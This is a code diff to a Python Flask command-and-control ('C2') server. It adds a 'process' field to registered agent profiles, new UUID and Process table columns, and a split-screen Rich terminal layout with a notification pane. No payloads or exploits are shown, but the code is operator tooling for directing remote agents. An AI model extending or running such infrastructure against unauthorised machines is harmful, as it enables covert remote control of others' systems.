@@ -19,6 +19,9 @@ from rich.console import Console
 from rich.table import Table
 from rich.panel import Panel
 from rich import box
+from rich.layout import Layout
+from rich.live import Live
+from rich.text import Text
 from prompt_toolkit import PromptSession
 from prompt_toolkit.history import FileHistory
 from storage import AgentStorage
@@ -30,6 +33,7 @@ app = Flask(__name__)
 storage = AgentStorage()
 console = Console()
 notification_queue = queue.Queue()
+notification_history = []  # Store all notifications for display
 shutdown_event = threading.Event()
 command_history_tracker = CommandHistory("command_history.json")
 
@@ -62,9 +66,10 @@ def hash_profile(profile):
     username = profile.get('username', 'unknown')
     hostname = profile.get('hostname', 'unknown')
     platform = profile.get('platform', 'unknown')
+    process = profile.get('process', 'unknown')
 
     # Create deterministic string
-    profile_string = f"{username}@{hostname}:{platform}"
+    profile_string = f"{username}@{hostname}:{platform}:{process}"
 
     # Hash to create UUID
     hash_digest = hashlib.sha256(profile_string.encode('utf-8')).hexdigest()
@@ -209,7 +214,7 @@ def post_instructions():
         return jsonify({'error': 'Missing required field: profile'}), 400
 
     profile = data['profile']
-    required_fields = ['username', 'hostname', 'platform']
+    required_fields = ['username', 'hostname', 'platform', 'process']
     if not all(field in profile for field in required_fields):
         return jsonify({'error': f'Profile missing required fields: {required_fields}'}), 400
 
@@ -253,7 +258,7 @@ def post_results():
         return jsonify({'error': 'Missing required field: profile'}), 400
 
     profile = data['profile']
-    required_profile_fields = ['username', 'hostname', 'platform']
+    required_profile_fields = ['username', 'hostname', 'platform', 'process']
     if not all(field in profile for field in required_profile_fields):
         return jsonify({'error': f'Profile missing required fields: {required_profile_fields}'}), 400
 
@@ -318,26 +323,31 @@ def display_agents_table():
         return
 
     table = Table(title="Registered Agents", box=box.ROUNDED)
+    table.add_column("UUID", style="dim", width=36)
     table.add_column("Profile", style="cyan", no_wrap=True)
     table.add_column("Platform", style="blue")
+    table.add_column("Process", style="magenta")
     table.add_column("First Seen", style="green")
     table.add_column("Last Seen", style="yellow")
-    table.add_column("Instructions", style="magenta")
+    table.add_column("Instructions", style="white")
 
     for agent_uuid, agent_data in agents.items():
         # Get profile info
         profile = agent_data.get('profile', {})
         profile_str = f"{profile.get('username', '?')}@{profile.get('hostname', '?')}"
         platform = profile.get('platform', '?')
+        process = profile.get('process', '?')
 
         # Truncate instructions for display
         instructions = agent_data['current_instructions']
-        if len(instructions) > 40:
-            instructions = instructions[:37] + "..."
+        if len(instructions) > 30:
+            instructions = instructions[:27] + "..."
 
         table.add_row(
+            agent_uuid,
             profile_str,
             platform,
+            process,
             agent_data['first_seen'][:19],
             agent_data['last_seen'][:19],
             instructions
@@ -360,6 +370,7 @@ def display_agent_details(agent_uuid: str):
 
     console.print(f"\n[bold cyan]Agent Details: {profile_str}[/bold cyan]")
     console.print(f"[blue]Platform:[/blue] {profile.get('platform', '?')}")
+    console.print(f"[magenta]Process:[/magenta] {profile.get('process', '?')}")
     console.print(f"[dim]UUID:[/dim] {agent_uuid}")
     console.print(f"[green]First Seen:[/green] {agent['first_seen']}")
     console.print(f"[yellow]Last Seen:[/yellow] {agent['last_seen']}")
@@ -686,7 +697,7 @@ def cmd_help():
 
 
 def check_notifications():
-    """Check for and display any pending notifications."""
+    """Check for and append any pending notifications to history."""
     try:
         while not notification_queue.empty():
             notification = notification_queue.get_nowait()
@@ -694,19 +705,88 @@ def check_notifications():
             if notification['type'] == 'new_agent':
                 profile = notification.get('profile', {})
                 profile_str = f"{profile.get('username', '?')}@{profile.get('hostname', '?')}"
-                console.print(f"\n[bold green]🔔 New agent connected: {profile_str}[/bold green]")
+                process = profile.get('process', '?')
+                notification_history.append({
+                    'type': 'new_agent',
+                    'message': f"🔔 New agent connected: {profile_str} ({process})",
+                    'timestamp': notification.get('timestamp', datetime.utcnow().isoformat())
+                })
             elif notification['type'] == 'new_result':
                 profile = notification.get('profile', {})
                 profile_str = f"{profile.get('username', '?')}@{profile.get('hostname', '?')}"
-                console.print(f"\n[bold blue]📊 New result from agent: {profile_str}[/bold blue]")
+                process = profile.get('process', '?')
+                notification_history.append({
+                    'type': 'new_result',
+                    'message': f"📊 New result from agent: {profile_str} ({process})",
+                    'timestamp': notification.get('timestamp', datetime.utcnow().isoformat())
+                })
 
     except queue.Empty:
         pass
 
 
+def render_notification_pane():
+    """Render the notification pane with scrollable notification history."""
+    if not notification_history:
+        return Panel(
+            "[dim]No notifications yet[/dim]",
+            title="[bold cyan]Notifications[/bold cyan]",
+            border_style="cyan",
+            box=box.ROUNDED
+        )
+
+    # Show all notifications (scrollable)
+    notification_text = Text()
+    for notif in notification_history:
+        timestamp = notif['timestamp'][:19] if 'timestamp' in notif else ''
+        msg_type = notif.get('type', '')
+
+        # Color code by type
+        if msg_type == 'new_agent':
+            notification_text.append(f"{timestamp} ", style="dim")
+            notification_text.append(f"{notif['message']}\n", style="bold green")
+        elif msg_type == 'new_result':
+            notification_text.append(f"{timestamp} ", style="dim")
+            notification_text.append(f"{notif['message']}\n", style="bold blue")
+        else:
+            notification_text.append(f"{timestamp} {notif['message']}\n")
+
+    return Panel(
+        notification_text,
+        title=f"[bold cyan]Notifications ({len(notification_history)})[/bold cyan]",
+        border_style="cyan",
+        box=box.ROUNDED
+    )
+
+
 def run_cli():
-    """Run interactive CLI."""
-    display_banner()
+    """Run interactive CLI with split-screen layout."""
+    from io import StringIO
+    from rich.console import Console as RichConsole
+
+    global console
+
+    # Create layout: 70% shell (top), 30% notifications (bottom)
+    layout = Layout()
+    layout.split_column(
+        Layout(name="shell", ratio=70),
+        Layout(name="notifications", ratio=30)
+    )
+
+    # Initial banner in shell pane
+    banner = Panel(
+        "[bold cyan]C2 Agent Management Server[/bold cyan]\n"
+        "[dim]Type 'help' for available commands[/dim]",
+        box=box.DOUBLE,
+        border_style="cyan",
+        expand=True
+    )
+    layout["shell"].update(banner)
+    layout["notifications"].update(render_notification_pane())
+
+    # Display initial layout
+    console.clear()
+    console.print(layout)
 
     # Create prompt session with file-based history for arrow key navigation
     session = PromptSession(history=FileHistory('.c2_shell_history'))
@@ -720,7 +800,7 @@ def run_cli():
         'instruct': cmd_instruct,
         'default_instructions': cmd_default_instructions,
         'show_prelude': cmd_show_prelude,
-        'clear': lambda args: cmd_clear(),
+        'clear': lambda args: None,  # Clear handled specially
         'help': lambda args: cmd_help(),
         'exit': lambda args: shutdown_server(),
     }
@@ -736,13 +816,32 @@ def run_cli():
             parts = user_input.strip().split()
 
             if not parts:
+                # Just refresh the layout to show any new notifications
+                layout["notifications"].update(render_notification_pane())
+                console.clear()
+                console.print(layout)
                 continue
 
             command = parts[0].lower()
             args = parts[1:]
 
+            # Handle clear command specially
+            if command == 'clear':
+                layout["shell"].update(banner)
+                layout["notifications"].update(render_notification_pane())
+                console.clear()
+                console.print(layout)
+                continue
+
             # Track command execution
             command_success = True
+            output_buffer = StringIO()
+            temp_console = RichConsole(file=output_buffer, width=console.width, force_terminal=True)
+
+            # Temporarily replace global console
+            original_console = console
+            console = temp_console
+
             try:
                 if command in commands:
                     commands[command](args)
@@ -753,11 +852,29 @@ def run_cli():
             except Exception as cmd_error:
                 console.print(f"[red]Command error: {cmd_error}[/red]")
                 command_success = False
-                raise  # Re-raise to be caught by outer exception handler
+            finally:
+                # Restore original console
+                console = original_console
+
+            # Get the captured output
+            output_str = output_buffer.getvalue()
+
+            # Update shell pane with command output
+            if output_str.strip():
+                layout["shell"].update(Panel(output_str, title=f"[cyan]Command: {user_input}[/cyan]", border_style="cyan", expand=True))
+            else:
+                layout["shell"].update(Panel("[dim]Command executed (no output)[/dim]", title=f"[cyan]Command: {user_input}[/cyan]", border_style="cyan", expand=True))
 
             # Record command in history (skip 'history' and 'search_history' commands)
             if command not in ['history', 'search_history']:
                 command_history_tracker.add_command(user_input, success=command_success)
+
+            # Update notification pane after command
+            layout["notifications"].update(render_notification_pane())
+
+            # Refresh the entire layout
+            console.clear()
+            console.print(layout)
 
         except KeyboardInterrupt:
             console.print("\n[yellow]Use 'exit' to shutdown the server[/yellow]")
